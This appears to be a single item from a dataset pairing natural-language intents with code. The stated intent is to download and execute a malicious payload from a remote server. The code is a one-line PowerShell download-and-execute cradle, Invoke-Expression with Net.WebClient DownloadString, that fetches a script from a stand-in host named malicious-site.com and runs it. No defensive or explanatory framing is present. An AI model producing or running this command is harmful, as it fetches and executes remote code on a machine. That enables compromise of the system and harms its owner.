# Natural language intent:
# Download and execute a malicious payload from a remote server.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-payload.ps1')"
